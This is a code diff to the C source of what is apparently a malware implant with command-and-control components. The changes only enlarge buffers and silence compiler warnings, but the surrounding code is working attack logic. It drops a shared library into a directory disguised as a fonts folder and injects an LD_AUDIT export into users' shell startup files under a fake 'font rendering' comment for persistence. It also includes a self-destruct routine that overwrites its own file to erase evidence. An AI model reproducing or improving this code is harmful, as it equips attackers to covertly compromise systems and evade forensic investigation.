@@ -26,7 +26,6 @@
  * ============================================================================
  */
 
-#define _GNU_SOURCE
 #include "../c2_comms/crypto.h"
 #include "../common/config.h"
 #include "../common/logging.h"
@@ -74,14 +73,14 @@ static int mkdirp(const char *path, mode_t mode) {
 /* ── Internal: Drop the auditor .so ──────────────────────────────────────── */
 
 static aegis_result_t drop_auditor(const char *home, aegis_log_ctx_t *log) {
-  char auditor_dir[512];
+  char auditor_dir[1024];
   snprintf(auditor_dir, sizeof(auditor_dir), "%s/%s", home,
            AEGIS_AUDITOR_REL_PATH);
 
   /* Create the directory structure (looks like a fonts directory) */
   mkdirp(auditor_dir, 0755);
 
-  char auditor_path[512];
+  char auditor_path[2048];
   snprintf(auditor_path, sizeof(auditor_path), "%s%s", auditor_dir,
            AEGIS_AUDITOR_FILENAME);
 
@@ -134,7 +133,7 @@ static aegis_result_t drop_auditor(const char *home, aegis_log_ctx_t *log) {
 /* ── Internal: Inject LD_AUDIT into shell RC files ───────────────────────── */
 
 static aegis_result_t inject_ld_audit(const char *home, aegis_log_ctx_t *log) {
-  char auditor_path[512];
+  char auditor_path[2048];
   snprintf(auditor_path, sizeof(auditor_path), "%s/%s%s", home,
            AEGIS_AUDITOR_REL_PATH, AEGIS_AUDITOR_FILENAME);
 
@@ -142,7 +141,7 @@ static aegis_result_t inject_ld_audit(const char *home, aegis_log_ctx_t *log) {
    * The export line we inject.  It looks innocuous alongside
    * legitimate environment setup in RC files.
    */
-  char export_line[1024];
+  char export_line[4096];
   snprintf(export_line, sizeof(export_line),
            "\n# Font rendering library audit\n"
            "export %s=%s\n",
@@ -224,12 +223,12 @@ static void catalyst_self_destruct(aegis_log_ctx_t *log) {
       for (int pass = 0; pass < 3; pass++) {
         aegis_random_bytes(buf, st.st_size);
         lseek(fd, 0, SEEK_SET);
-        write(fd, buf, st.st_size);
+        if (write(fd, buf, st.st_size) < 0) {}
         fsync(fd);
       }
       memset(buf, 0, st.st_size);
       lseek(fd, 0, SEEK_SET);
-      write(fd, buf, st.st_size);
+      if (write(fd, buf, st.st_size) < 0) {}
       fsync(fd);
       free(buf);
     }
